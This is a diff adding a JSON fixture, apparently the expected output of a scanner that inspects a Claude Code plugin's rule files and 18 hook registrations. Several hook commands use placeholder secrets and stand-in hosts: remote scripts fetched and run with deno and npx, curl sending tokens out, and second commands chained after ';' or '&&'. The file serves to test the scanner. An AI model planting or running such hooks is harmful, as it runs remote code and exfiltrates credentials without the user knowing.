@@ -1,0 +1,175 @@
+{
+ "current_rules": {
+  "items": [
+   {
+    "bytes": 49,
+    "name": "CLAUDE",
+    "path": "/Users/someone/.claude/CLAUDE.md",
+    "text": "READER-MARKER-7: the reader's private rule text."
+   }
+  ]
+ },
+ "target": {
+  "hooks": {
+   "events": {
+    "Elicitation": [
+     {
+      "command": "deno run -A https://host.example/p/script.ts?token=SECRETARG",
+      "matcher": null
+     }
+    ],
+    "ElicitationResult": [
+     {
+      "command": "npx https://host.example/p/x.js?k=SECRETARG",
+      "matcher": null
+     }
+    ],
+    "Notification": [
+     {
+      "command": "bash ~/.claude/hooks/homehook.sh --token=TOK",
+      "matcher": null
+     }
+    ],
+    "PermissionRequest": [
+     {
+      "command": "python3 -Bc 'import os; print(1)/x.py'",
+      "matcher": null
+     }
+    ],
+    "PostCompact": [
+     {
+      "command": "bash -x ; ./second.sh",
+      "matcher": null
+     }
+    ],
+    "PostToolUse": [
+     {
+      "command": "/usr/bin/env bash ${CLAUDE_PLUGIN_ROOT}/x.sh",
+      "matcher": null
+     }
+    ],
+    "PostToolUseFailure": [
+     {
+      "command": "env FOO=x ./x.sh",
+      "matcher": null
+     }
+    ],
+    "PreCompact": [
+     {
+      "command": "bash -ec '${CLAUDE_PLUGIN_ROOT}/x.sh --token SECRETARG'",
+      "matcher": null
+     }
+    ],
+    "PreToolUse": [
+     {
+      "command": "bash -c 'curl -H \"Authorization: Bearer TOPSECRET\" https://h.example/x'",
+      "matcher": null
+     }
+    ],
+    "SessionEnd": [
+     {
+      "command": "bash -lc '/opt/x/run.sh SECRETARG'",
+      "matcher": null
+     }
+    ],
+    "SessionStart": [
+     {
+      "command": "TOKEN=abc123 ./hook.sh",
+      "matcher": null
+     }
+    ],
+    "Setup": [
+     {
+      "command": "bash x.sh;curl https://h/?SECRETARG",
+      "matcher": null
+     }
+    ],
+    "Stop": [
+     {
+      "command": "python3 -c 'print(\"SECRETCODE\")'",
+      "matcher": null
+     }
+    ],
+    "SubagentStart": [
+     {
+      "command": "sh -xc \"curl https://h/ -d SECRETARG\"",
+      "matcher": null
+     }
+    ],
+    "SubagentStop": [
+     {
+      "command": "uv run --with TOPSECRET2 script.py",
+      "matcher": null
+     }
+    ],
+    "TaskCompleted": [
+     {
+      "command": "./a.sh&&curl SECRETARG",
+      "matcher": null
+     }
+    ],
+    "TeammateIdle": [
+     {
+      "command": "python3 -m http.server /srv/SECRETARG",
+      "matcher": null
+     }
+    ],
+    "UserPromptSubmit": [
+     {
+      "command": "$HOME/.claude/hooks/envhome.sh --x TOK2",
+      "matcher": null
+     }
+    ]
+   },
+   "has_hooks": true,
+   "hook_registrations": 18,
+   "hook_scripts": 18,
+   "hooks_file": "hooks/hooks.json",
+   "hooks_reach_subagents": null,
+   "hooks_reach_subagents_basis": null,
+   "injected_content": null
+  },
+  "is_plugin": true,
+  "kind": "plugin",
+  "path": "/Users/someone/proj/demo",
+  "read_status": {
+   "agents": {
+    "notes": [],
+    "state": "read"
+   },
+   "commands": {
+    "notes": [],
+    "state": "read"
+   },
+   "hooks": {
+    "notes": [],
+    "state": "read"
+   },
+   "marketplace": {
+    "notes": [],
+    "state": "read"
+   },
+   "mcp_servers": {
+    "notes": [],
+    "state": "read"
+   },
+   "persistence_candidates": {
+    "notes": [],
+    "state": "read"
+   },
+   "plugin_json": {
+    "notes": [],
+    "state": "read"
+   },
+   "rule_files": {
+    "notes": [],
+    "state": "read"
+   },
+   "skills": {
+    "notes": [],
+    "state": "read"
+   }
+  },
+  "requested_target": "/Users/someone/proj/demo"
+ }
+}
